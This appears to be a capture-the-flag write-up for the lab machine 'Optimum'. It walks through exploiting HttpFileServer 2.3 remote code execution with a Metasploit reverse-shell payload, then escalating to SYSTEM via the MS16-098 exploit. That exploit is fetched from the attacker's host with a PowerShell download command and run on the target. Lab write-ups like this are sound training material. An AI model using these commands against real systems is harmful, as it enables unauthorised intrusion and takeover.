# Optimum

This is the write-up for the machine called Optimum.

## Scanning & Enumeration

Let'a start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.8
```

Relevant results of the scan:

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP 

The machine is a Windows machine with HTTP port 80 open. Th web page has an application called **HttpFileServer 2.3**.
After googling this, we get to know that it is a Rejetto HTTP File Server and the HttpFileServer 2.3 is vulnerable to a Remote Code Execution.
We can also search with searchsploit:

```markdown
searchsploit rejetto
```

We can use the **Metasploit** module **exploit/windows/http/rejetto_hfs_exec** to exploit the vulnerability. 
We can configure RHOSTS, LHOST, LPORT, and set the payload to **payload/windows/x64/meterpreter/reverse_tcp** and run the exploit.
After running the exploit, a meterpreter shell will open and we will be user **kostas** on the machine.

## Privilege Escalation by manual exploitation

We can look up exploits for the machine running a Windows Server 2012 R2 9600 OS on metasploit but the exploit listed sometimes does not work.
We will exploit this machine manually.
To do so, download the [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git) on your machine and run the following commands:

```markdown
pip install xlrd --upgrade
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2019-10-05-mssb.xls --systeminfo sysinfo.txt
```

Windows Exploit Suggester lists down a couple of exploits but we will use the MS16-098 exploit.
[exploit-db](https://www.exploit-db.com) has a binary file of the exploit that we can download on our machine and then transfer it to Optimum.

Run the following commands on your machine:

```markdown
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
python -m SimpleHTTPServer 9000
```

We are hosting the binary file on our machine, we can find it on <your_ip>:9000

Run the following commands on Optimum after navigating to a folder that you have write access to:
```markdown
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<your_ip>:9000/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
41020.exe
```

After the execution, we will be **NT Authority\SYSTEM** on Optimum.
